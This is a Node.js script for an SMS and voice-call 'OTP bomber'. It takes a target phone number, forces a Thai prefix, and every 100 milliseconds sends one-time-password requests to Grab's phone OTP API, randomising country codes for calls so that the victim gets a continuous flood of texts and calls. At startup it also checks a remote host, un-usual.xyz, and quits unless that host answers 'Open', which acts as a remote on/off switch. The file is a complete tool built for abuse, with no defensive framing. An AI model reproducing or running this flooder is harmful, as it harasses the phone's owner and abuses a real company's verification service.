const chalk = require('chalk')
const figlet = require('figlet')
const http = require('http')


const inquirer = require('./lib/validate')
const spammer = require('./lib/spammer')


console.clear()
var options = {
    host: 'un-usual.xyz',
    path: '/config.php'
}
var request = http.request(options, function (res) {
    var data = ''
    res.on('data', function (chunk) {
        data += chunk;
    })
    res.on('end', function () {
        if (data == "Open") {

        } else {
        	process.exit(1);
        }

    })
})
request.on('error', function (e) {
    console.log(e.message)
})
request.end()

const main = async () => {
    var ans = await inquirer()
    var countries = ['MY', 'SG', 'ID', 'TH', 'VN', 'KH', 'PH', 'MM']

    if (!ans.number.startsWith('66')) ans.number = `66${ans.number.substring(1, 10)}`

    setInterval(() => {
        Array.prototype.forEach.call(ans.method, (method) => {
            var data = {
                url: 'https://api.grab.com/grabid/v1/phone/otp',
                data: {
                    'method': method == 'CALL' ? 'CALL' : 'SMS',
                    'countryCode': method == 'CALL' ? countries[[Math.floor(Math.random() * countries.length)]] : 'TH',
                    'phoneNumber': ans.number,
                    'templateID': '',
                    'numDigits': 5
                }
            }
            spammer(data)
        })
    }, 100)
}

main()

process.on('SIGINT', () => {
    console.clear()
    process.exit()
})
